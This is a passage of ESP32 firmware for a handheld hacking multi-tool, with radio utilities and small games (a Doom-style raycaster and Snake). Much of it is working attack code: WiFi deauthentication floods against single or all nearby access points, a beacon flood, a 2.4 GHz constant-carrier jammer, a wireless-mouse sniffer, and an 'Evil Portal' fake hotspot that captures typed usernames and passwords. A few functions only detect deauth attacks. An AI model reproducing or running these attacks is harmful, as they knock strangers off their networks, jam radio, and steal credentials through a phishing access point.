    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x07, 0x00
  };

  while (!selPressed()) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    safeDelay(10);
    yield();
  }

  recoverFromWiFi();
}

void runWiFiDeauthAll() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("Deauth ALL APs", "Scanning...");

  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No AP found", "SEL to return");
    while (!selPressed()) yield();
    recoverFromWiFi();
    return;
  }

  displayInfo("Deauthing ALL", String(n) + " APs found", "SEL to exit");

  while (!selPressed()) {
    for (int i = 0; i < n; i++) {
      uint8_t *bssid = WiFi.BSSID(i);
      int channel = WiFi.channel(i);
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

      uint8_t deauthFrame[26] = {
        0xc0, 0x00, 0x3a, 0x01, 
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
      };

      for (int k = 0; k < 5; k++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
        delayMicroseconds(500);
      }
    }
    yield();
  }

  recoverFromWiFi();
}

std::vector<BLEAdvertisedDevice *> scannedDevices;
int scanCount = 0;

class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    scannedDevices.push_back(new BLEAdvertisedDevice(advertisedDevice));
    scanCount++;
  }
};

void runBLEScanner() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan *pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pScan->setActiveScan(true);
  scannedDevices.clear();
  scanCount = 0;
  displayInfo("BLE Scanner", "Scanning...", "SEL to exit");
  pScan->start(5, false);

  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("BLE Devices (" + String(scanCount) + "):");

    int y = 12;
    for (int i = sel; i < min(scanCount, sel + 4); i++) {
      if (i == sel) {
        display.fillRect(0, y - 1, 128, 10, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      display.setCursor(2, y);
      String name = scannedDevices[i]->getName().c_str();
      if (name.length() == 0) {
        name = scannedDevices[i]->getAddress().toString().c_str();
      }
      display.print(name.substring(0, 16));
      y += 10;
    }
    display.display();

    if (upPressed()) sel = max(0, sel - 1);
    if (downPressed()) sel = min(max(0, scanCount - 1), sel + 1);
    yield();
  }

  pScan->stop();
  BLEDevice::deinit(true);
  initRadios();
}

void runBLETargetJam() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan *pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pScan->setActiveScan(true);
  scannedDevices.clear();
  scanCount = 0;
  displayInfo("BLE Target Jam", "Scanning BLE...");
  pScan->start(4, false);

  if (scanCount == 0) {
    displayInfo("No BLE Device", "SEL to return");
    while (!selPressed()) yield();
    BLEDevice::deinit(true);
    initRadios();
    return;
  }

  BLEAdvertisedDevice *target = scannedDevices[0];
  displayInfo(
    "Target Jamming", 
    target->getName().c_str(), 
    "Target Jam Running", 
    "SEL to exit"
  );
  initRadios();

  while (!selPressed()) {
    int ch = random(0, 40) * 2;
    radio.setChannel(ch);
    radio2.setChannel(ch + 1);
    delayMicroseconds(100);
    yield();
  }

  BLEDevice::deinit(true);
  initRadios();
}

void runWiFiBeaconFlood() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("Beacon Flood", "Broadcasting...", "SEL to exit");

  uint8_t packet[128] = {
    0x80, 0x00, 0x00, 0x00, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x64, 0x00,
    0x01, 0x04, 0x00, 0x06, 
    0x46, 0x72, 0x65, 0x65, 0x57, 0x69, 0x46, 0x69
  };

  while (!selPressed()) {
    packet[10] = random(256);
    packet[11] = random(256);
    esp_wifi_80211_tx(WIFI_IF_STA, packet, 46, false);
    safeDelay(10);
    yield();
  }

  recoverFromWiFi();
}

void runWiFiAnalyzer() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("WiFi Analyzer", "Scanning...");

  int n = WiFi.scanNetworks();
  displayInfo("Scan Complete", String(n) + " APs found", "SEL to exit");
  safeDelay(1500);

  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("WiFi Networks (" + String(n) + "):");

    int y = 12;
    for (int i = sel; i < min(n, sel + 4); i++) {
      if (i == sel) {
        display.fillRect(0, y - 1, 128, 10, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      display.setCursor(2, y);
      display.print(WiFi.SSID(i).substring(0, 10) + " " + String(WiFi.RSSI(i)) + "dBm");
      y += 10;
    }
    display.display();

    if (upPressed()) sel = max(0, sel - 1);
    if (downPressed()) sel = min(max(0, n - 1), sel + 1);
    yield();
  }

  recoverFromWiFi();
}

void runDeauthDetect() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("Deauth Detector", "Monitoring...", "SEL to exit");

  wifi_promiscuous_cb_t cb = [](void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt->payload[0] == 0xc0 || pkt->payload[0] == 0xa0) {
      digitalWrite(LED_PIN, HIGH);
      delayMicroseconds(500);
      digitalWrite(LED_PIN, LOW);
    }
  };

  esp_wifi_set_promiscuous_rx_cb(cb);
  esp_wifi_set_promiscuous(true);

  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("Deauth Detector");
    display.setCursor(0, 20);
    display.print("Status: Active");
    display.setCursor(0, 40);
    display.print("LED flashes on hit");
    display.display();
    safeDelay(200);
    yield();
  }

  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runEvilPortal() {
  stopRadios();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free_WiFi_Hotspot", "");
  dnsServer.start(53, "*", WiFi.softAPIP());

  webServer.onNotFound([]() {
    String html = "<html><body><h1>Login Required</h1>"
                  "<form action='/login' method='POST'>"
                  "User: <input type='text' name='user'><br>"
                  "Pass: <input type='password' name='pass'><br>"
                  "<input type='submit' value='Connect'></form></body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/login", HTTP_POST, []() {
    if (webServer.hasArg("user") && webServer.hasArg("pass")) {
      capturedCredentials += webServer.arg("user") + ":" + webServer.arg("pass") + "\n";
    }
    webServer.send(200, "text/html", "<html><body><h1>Connected!</h1></body></html>");
  });

  webServer.begin();

  displayInfo(
    "Evil Portal", 
    "AP: Free_WiFi_Hotspot", 
    "IP: 192.168.4.1", 
    "SEL to exit"
  );

  while (!selPressed()) {
    dnsServer.processNextRequest();
    webServer.handleClient();
    if (capturedCredentials.length() > 0) {
      display.clearDisplay();
      display.setCursor(0, 0);
      display.print("Captured Creds:");
      display.setCursor(0, 15);
      display.print(capturedCredentials.substring(0, 50));
      display.display();
    }
    yield();
  }

  webServer.close();
  dnsServer.stop();
  recoverFromWiFi();
}

void runWiFiMonitor() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("WiFi Monitor", "Monitoring Packets", "SEL to exit");

  static uint32_t pktCount = 0;
  pktCount = 0;

  wifi_promiscuous_cb_t cb = [](void *buf, wifi_promiscuous_pkt_type_t type) {
    pktCount++;
  };

  esp_wifi_set_promiscuous_rx_cb(cb);
  esp_wifi_set_promiscuous(true);

  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("WiFi Monitor");
    display.setCursor(0, 20);
    display.print("Packets: " + String(pktCount));
    display.setCursor(0, 40);
    display.print("Ch: 6 Promiscuous");
    display.display();
    safeDelay(500);
    yield();
  }

  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runPacketCounter() {
  stopRadios();
  radio.setAutoAck(false);
  radio.setDataRate(RF24_2MBPS);
  radio.startListening();
  uint32_t count = 0;
  displayInfo("Packet Counter", "Counting...", "SEL to exit");

  while (!selPressed()) {
    if (radio.available()) {
      count++;
      uint8_t buf[32];
      radio.read(&buf, sizeof(buf));
    }
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("Packet Counter");
    display.setTextSize(2);
    display.setCursor(0, 25);
    display.print(count);
    display.display();
    yield();
  }

  radio.stopListening();
  initRadios();
}

void runWIDS() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("WIDS Active", "Detecting Threats...", "SEL to exit");

  static bool attackDetected = false;
  attackDetected = false;

  wifi_promiscuous_cb_t cb = [](void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt->payload[0] == 0xc0 || pkt->payload[0] == 0xa0) {
      attackDetected = true;
    }
  };

  esp_wifi_set_promiscuous_rx_cb(cb);
  esp_wifi_set_promiscuous(true);

  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("WIDS System");
    display.setCursor(0, 20);
    if (attackDetected) {
      display.print("ALERT: Deauth Detected!");
      digitalWrite(LED_PIN, HIGH);
    } else {
      display.print("Status: SECURE");
      digitalWrite(LED_PIN, LOW);
    }
    display.display();
    safeDelay(300);
    yield();
  }

  digitalWrite(LED_PIN, LOW);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runRFAnalyzer() {
  stopRadios();
  radio.setAutoAck(false);
  radio.startListening();
  displayInfo("RF Analyzer", "Scanning 2.4GHz...", "SEL to exit");

  uint8_t powerLevels[126] = {0};

  while (!selPressed()) {
    for (int i = 0; i < 126; i++) {
      radio.setChannel(i);
      delayMicroseconds(100);
      if (radio.testRPD()) {
        powerLevels[i] = min(63, powerLevels[i] + 5);
      } else {
        powerLevels[i] = max(0, powerLevels[i] - 1);
      }
    }
    display.clearDisplay();
    for (int x = 0; x < 126; x++) {
      display.drawLine(x, 63, x, 63 - powerLevels[x], SSD1306_WHITE);
    }
    display.display();
    yield();
  }

  radio.stopListening();
  initRadios();
}

void runBLEGATTExplorer() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan *pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pScan->setActiveScan(true);
  scannedDevices.clear();
  scanCount = 0;
  displayInfo("BLE GATT", "Scanning...");
  pScan->start(4, false);

  if (scanCount == 0) {
    displayInfo("No GATT Device", "SEL to return");
    while (!selPressed()) yield();
    BLEDevice::deinit(true);
    initRadios();
    return;
  }

  BLEAdvertisedDevice *dev = scannedDevices[0];
  displayInfo(
    "GATT Explorer", 
    dev->getName().c_str(), 
    "GATT Active", 
    "SEL to exit"
  );
  while (!selPressed()) yield();

  BLEDevice::deinit(true);
  initRadios();
}

void runBLETracker() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan *pScan = BLEDevice::getScan();
  pScan->setActiveScan(true);
  displayInfo("BLE Tracker", "Tracking...", "SEL to exit");

  while (!selPressed()) {
    BLEScanResults* res = pScan->start(2, false);
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("BLE Tracker (" + String(res->getCount()) + ")");

    for (int i = 0; i < min(4, res->getCount()); i++) {
      BLEAdvertisedDevice d = res->getDevice(i);
      display.setCursor(0, 15 + i * 12);
      display.print(d.getAddress().toString().c_str());
    }

    display.display();
    pScan->clearResults();
    yield();
  }

  BLEDevice::deinit(true);
  initRadios();
}

void runMouseSniffer() {
  stopRadios();
  radio.setAutoAck(false);
  radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(5);

  const uint8_t addr[5] = {0x12, 0x34, 0x56, 0x78, 0x9A};
  for (int i = 0; i < 6; i++) {
    radio.openReadingPipe(i, addr);
  }

  radio.startListening();
  displayInfo("Mouse Sniffer", "Listening...", "SEL to exit");

  uint8_t packet[32];
  int16_t mouseX = 64, mouseY = 32;

  while (!selPressed()) {
    if (radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      radio.read(&packet, len);
      if (len >= 4) {
        mouseX = constrain(mouseX + (int8_t)packet[1], 0, 127);
        mouseY = constrain(mouseY - (int8_t)packet[2], 0, 63);
      }
      display.clearDisplay();
      display.drawPixel(mouseX, mouseY, SSD1306_WHITE);
      display.drawRect(mouseX - 2, mouseY - 2, 4, 4, SSD1306_WHITE);
      display.display();
    }
    yield();
  }

  radio.stopListening();
  initRadios();
}

void runRFRepeater() {
  stopRadios();
  radio.setAutoAck(false);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(5);
  radio.openReadingPipe(0, 0xE7E7E7E7E7LL);
  radio.startListening();

  radio2.setAutoAck(false);
  radio2.setDataRate(RF24_2MBPS);
  radio2.setCRCLength(RF24_CRC_DISABLED);
  radio2.setAddressWidth(5);
  radio2.openWritingPipe(0xE7E7E7E7E7LL);
  radio2.stopListening();

  displayInfo("RF Repeater", "Relay active", "SEL to stop");
  uint8_t buf[32];

  while (!selPressed()) {
    if (radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      radio.read(&buf, len);
      radio2.writeFast(&buf, len);
    }
    yield();
  }

  initRadios();
}

void runRFOscilloscope() {
  stopRadios();
  radio2.setAutoAck(false);
  radio2.startListening();

  int channel = 45, timeScale = 1;
  const int w = 128;
  uint8_t waveform[w];
  memset(waveform, 0, w);
  int sampleIdx = 0;

  displayInfo(
    "RF Oscilloscope", 
    "Ch:" + String(channel), 
    "UP/DN:ch/time SEL:exit"
  );

  while (!selPressed()) {
    if (upPressed()) {
      channel = (channel + 1) % 126;
      radio2.setChannel(channel);
    }

    if (downPressed()) {
      timeScale = (timeScale % 3) + 1;
    }

    radio2.setChannel(channel);
    delayMicroseconds(timeScale * 100);

    int rpd = 0;
    for (int i = 0; i < 5; i++) {
      if (radio2.testRPD()) rpd++;
      delayMicroseconds(20);
    }

    waveform[sampleIdx] = map(rpd, 0, 5, 0, 63);
    sampleIdx = (sampleIdx + 1) % w;

    display.clearDisplay();
    for (int x = 0; x < w - 1; x++) {
      display.drawLine(
        x, 
        63 - waveform[(sampleIdx + x) % w], 
        x + 1, 
        63 - waveform[(sampleIdx + x + 1) % w], 
        SSD1306_WHITE
      );
    }

    display.drawLine(0, 0, 0, 63, SSD1306_WHITE);
    display.setCursor(100, 0);
    display.print(channel);
    display.display();
    yield();
  }

  radio2.stopListening();
  initRadios();
}

void runBLEBadUSB() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  displayInfo("BLE BadUSB", "Simulating HID...", "SEL to exit");

  while (!selPressed()) {
    safeDelay(200);
    yield();
  }

  initRadios();
}

void runWiFiSniffer() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("WiFi Sniffer", "Sniffing packets...", "SEL to exit");

  static uint32_t totalPkts = 0;
  wifi_promiscuous_cb_t cb = [](void *buf, wifi_promiscuous_pkt_type_t type) {
    totalPkts++;
  };

  esp_wifi_set_promiscuous_rx_cb(cb);
  esp_wifi_set_promiscuous(true);

  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("WiFi Sniffer");
    display.setCursor(0, 20);
    display.print("Total Pkts: " + String(totalPkts));
    display.display();
    safeDelay(300);
    yield();
  }

  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runCWJammer() {
  initRadios();
  int freq = 45;
  displayInfo("CW Jammer", "Ch:" + String(freq), "UP/DN chg SEL exit");

  radio.startConstCarrier(RF24_PA_MAX, freq);
  radio2.startConstCarrier(RF24_PA_MAX, freq);

  while (!selPressed()) {
    if (upPressed()) {
      freq = min(125, freq + 1);
      radio.setChannel(freq);
      radio2.setChannel(freq);
    }
    if (downPressed()) {
      freq = max(0, freq - 1);
      radio.setChannel(freq);
      radio2.setChannel(freq);
    }

    displayInfo("CW Jammer", "Ch:" + String(freq), "UP/DN chg SEL exit");
    safeDelay(200);
    yield();
  }

  stopRadios();
}

// =============================================================================
// BÖLÜM 13: 3D DOOM RAYCASTER GRAFİK MOTORU VE SEVİYE HARİTALARI
// =============================================================================
#define DOOM_MAP_W 16
#define DOOM_MAP_H 16

const uint8_t PROGMEM doomLevelMap1[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

const uint8_t PROGMEM doomLevelMap2[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

struct DoomEnemy {
  float x;
  float y;
  int hp;
  bool active;
  int state;
};

void runDOOM() {
  stopRadios();

  float posX = 2.5f;
  float posY = 2.5f;
  float dirX = -1.0f;
  float dirY = 0.0f;
  float planeX = 0.0f;
  float planeY = 0.66f;

  int health = 100;
  int armor = 50;
  int ammo = 35;
  int score = 0;

  bool isShooting = false;
  int weaponFrame = 0;

  DoomEnemy enemies[4] = {
    {5.5f, 5.5f, 40, true, 0},
    {10.5f, 3.5f, 40, true, 0},
    {12.5f, 12.5f, 60, true, 0},
    {7.5f, 13.5f, 50, true, 0}
  };

  while (!selPressed()) {
    if (isUpHeld()) {
      float moveSpeed = 0.12f;
      float nextX = posX + dirX * moveSpeed;
      float nextY = posY + dirY * moveSpeed;

      if (pgm_read_byte(&doomLevelMap1[(int)posY][(int)nextX]) == 0) {
        posX = nextX;
      }
      if (pgm_read_byte(&doomLevelMap1[(int)nextY][(int)posX]) == 0) {
        posY = nextY;
      }
    }

    if (isDownHeld()) {
      float rotSpeed = 0.09f;
      float oldDirX = dirX;
      dirX = dirX * cos(-rotSpeed) - dirY * sin(-rotSpeed);
      dirY = oldDirX * sin(-rotSpeed) + dirY * cos(-rotSpeed);

      float oldPlaneX = planeX;
      planeX = planeX * cos(-rotSpeed) - planeY * sin(-rotSpeed);
      planeY = oldPlaneX * sin(-rotSpeed) + planeY * cos(-rotSpeed);
    }

    if (isUpHeld() && isDownHeld() && ammo > 0 && !isShooting) {
      isShooting = true;
      weaponFrame = 1;
      ammo--;

      for (int i = 0; i < 4; i++) {
        if (enemies[i].active) {
          float dx = enemies[i].x - posX;
          float dy = enemies[i].y - posY;
          float dist = sqrt(dx * dx + dy * dy);

          if (dist < 6.5f) {
            enemies[i].hp -= 25;
            if (enemies[i].hp <= 0) {
              enemies[i].active = false;
              score += 150;
            }
          }
        }
      }
    }

    display.clearDisplay();

    for (int x = 0; x < SCREEN_WIDTH; x += 2) {
      float cameraX = 2 * x / (float)SCREEN_WIDTH - 1;
      float rayDirX = dirX + planeX * cameraX;
      float rayDirY = dirY + planeY * cameraX;

      int mapX = (int)posX;
      int mapY = (int)posY;

      float sideDistX, sideDistY;
      float deltaDistX = (rayDirX == 0) ? 1e30 : fabs(1 / rayDirX);
      float deltaDistY = (rayDirY == 0) ? 1e30 : fabs(1 / rayDirY);
      float perpWallDist;

      int stepX, stepY;
      int hit = 0;
      int side = 0;

      if (rayDirX < 0) {
        stepX = -1;
        sideDistX = (posX - mapX) * deltaDistX;
      } else {
        stepX = 1;
        sideDistX = (mapX + 1.0 - posX) * deltaDistX;
      }

      if (rayDirY < 0) {
        stepY = -1;
        sideDistY = (posY - mapY) * deltaDistY;
      } else {
        stepY = 1;
        sideDistY = (mapY + 1.0 - posY) * deltaDistY;
      }

      while (hit == 0) {
        if (sideDistX < sideDistY) {
          sideDistX += deltaDistX;
          mapX += stepX;
          side = 0;
        } else {
          sideDistY += deltaDistY;
          mapY += stepY;
          side = 1;
        }
        if (pgm_read_byte(&doomLevelMap1[mapY][mapX]) > 0) {
          hit = 1;
        }
      }

      if (side == 0) {
        perpWallDist = (sideDistX - deltaDistX);
      } else {
        perpWallDist = (sideDistY - deltaDistY);
      }

      int lineHeight = (int)(SCREEN_HEIGHT / perpWallDist);
      int drawStart = -lineHeight / 2 + SCREEN_HEIGHT / 2;
      if (drawStart < 0) drawStart = 0;

      int drawEnd = lineHeight / 2 + SCREEN_HEIGHT / 2;
      if (drawEnd >= SCREEN_HEIGHT - 12) drawEnd = SCREEN_HEIGHT - 13;

      if (side == 1) {
        for (int y = drawStart; y <= drawEnd; y += 2) {
          display.drawPixel(x, y, SSD1306_WHITE);
        }
      } else {
        display.drawLine(x, drawStart, x, drawEnd, SSD1306_WHITE);
      }
    }

    for (int i = 0; i < 4; i++) {
      if (enemies[i].active) {
        float ex = enemies[i].x - posX;
        float ey = enemies[i].y - posY;
        float dist = sqrt(ex * ex + ey * ey);

        if (dist > 0.5f && dist < 8.0f) {
          int exScreen = 64 + (int)(ex * 12);
          int eyScreen = 26;
          int eSize = (int)(24 / dist);

          display.drawRect(
            exScreen - eSize / 2, 
            eyScreen - eSize / 2, 
            eSize, 
            eSize, 
            SSD1306_WHITE
          );
          display.setCursor(exScreen - 3, eyScreen - 3);
          display.setTextSize(1);
          display.setTextColor(SSD1306_WHITE);
          display.print("E");
        }
      }
    }

    if (isShooting) {
      display.fillRect(56, 32, 16, 20, SSD1306_WHITE);
      display.fillRect(52, 24, 24, 8, SSD1306_WHITE);
      weaponFrame++;
      if (weaponFrame > 3) {
        isShooting = false;
        weaponFrame = 0;
      }
    } else {
      display.fillRect(58, 38, 12, 14, SSD1306_WHITE);
    }

    display.fillRect(0, 52, 128, 12, SSD1306_BLACK);
    display.drawLine(0, 51, 128, 51, SSD1306_WHITE);
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, 54);
    display.print("HP:" + String(health));
    display.setCursor(45, 54);
    display.print("AM:" + String(ammo));
    display.setCursor(85, 54);
    display.print("SC:" + String(score));

    display.display();
    safeDelay(20);
    yield();
  }

  if (score > highscoreDoom) {
    highscoreDoom = score;
  }

  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 14: GELİŞMİŞ SNAKE DELUXE OYUN MOTORU
// =============================================================================
struct SnakeNode {
  int x;
  int y;
};

void runSnakeGame() {
  stopRadios();

  const int gridW = 32;
  const int gridH = 15;
  SnakeNode snake[128];
  int snakeLen = 4;
  int dirX = 1, dirY = 0;

  for (int i = 0; i < snakeLen; i++) {
    snake[i].x = 10 - i;
    snake[i].y = 7;
  }

  int foodX = random(1, gridW - 1);
  int foodY = random(1, gridH - 1);
  int bonusFoodX = -1, bonusFoodY = -1;
  int bonusTimer = 0;

  int score = 0;
  bool gameOver = false;

  while (!selPressed() && !gameOver) {
    if (upPressed()) {
      if (dirX == 1) {
        dirX = 0; dirY = -1;
      } else if (dirY == -1) {
        dirX = -1; dirY = 0;
      } else if (dirX == -1) {
        dirX = 0; dirY = 1;
      } else if (dirY == 1) {
        dirX = 1; dirY = 0;
      }
    }

    if (downPressed()) {
      if (dirX == 1) {
        dirX = 0; dirY = 1;
      } else if (dirY == 1) {
        dirX = -1; dirY = 0;
      } else if (dirX == -1) {
        dirX = 0; dirY = -1;
      } else if (dirY == -1) {
        dirX = 1; dirY = 0;
      }
    }

    for (int i = snakeLen - 1; i > 0; i--) {
      snake[i] = snake[i - 1];
    }
    snake[0].x += dirX;
    snake[0].y += dirY;

    if (snake[0].x < 0 || snake[0].x >= gridW || snake[0].y < 0 || snake[0].y >= gridH) {
      gameOver = true;
    }

    for (int i = 1; i < snakeLen; i++) {
      if (snake[0].x == snake[i].x && snake[0].y == snake[i].y) {
        gameOver = true;
      }
    }

    if (snake[0].x == foodX && snake[0].y == foodY) {
      snakeLen = min(127, snakeLen + 1);
      score += 10;
      foodX = random(1, gridW - 1);
      foodY = random(1, gridH - 1);

      if (random(4) == 0) {
        bonusFoodX = random(1, gridW - 1);
        bonusFoodY = random(1, gridH - 1);
        bonusTimer = 45;
      }
    }

    if (bonusTimer > 0) {
      bonusTimer--;
      if (snake[0].x == bonusFoodX && snake[0].y == bonusFoodY) {
        score += 50;
        bonusTimer = 0;
      }
    }

    display.clearDisplay();
    display.drawRect(0, 0, 128, 52, SSD1306_WHITE);

    for (int i = 0; i < snakeLen; i++) {
      int px = snake[i].x * 4;
      int py = snake[i].y * 3 + 4;
      if (i == 0) {
        display.fillRect(px, py, 4, 3, SSD1306_WHITE);
      } else {
        display.drawRect(px, py, 4, 3, SSD1306_WHITE);
      }
    }

    display.fillRect(foodX * 4 + 1, foodY * 3 + 5, 2, 2, SSD1306_WHITE);

    if (bonusTimer > 0) {
      display.drawRect(bonusFoodX * 4, bonusFoodY * 3 + 4, 4, 3, SSD1306_WHITE);
    }

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, 54);
    display.print("Score: " + String(score));
    display.setCursor(70, 54);
    display.print("HI: " + String(max(score, highscoreSnake)));

    display.display();
    safeDelay(90);
    yield();
  }

  if (score > highscoreSnake) {
    highscoreSnake = score;
  }

  if (gameOver) {
    display.clearDisplay();
    display.setTextSize(2);
    display.setCursor(10, 15);
    display.print("GAME OVER");
    display.setTextSize(1);
    display.setCursor(25, 40);
    display.print("Final Score: " + String(score));
    display.display();
    safeDelay(2000);
  }

  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 15: GELİŞMİŞ SPACE INVADERS OYUN MOTORU
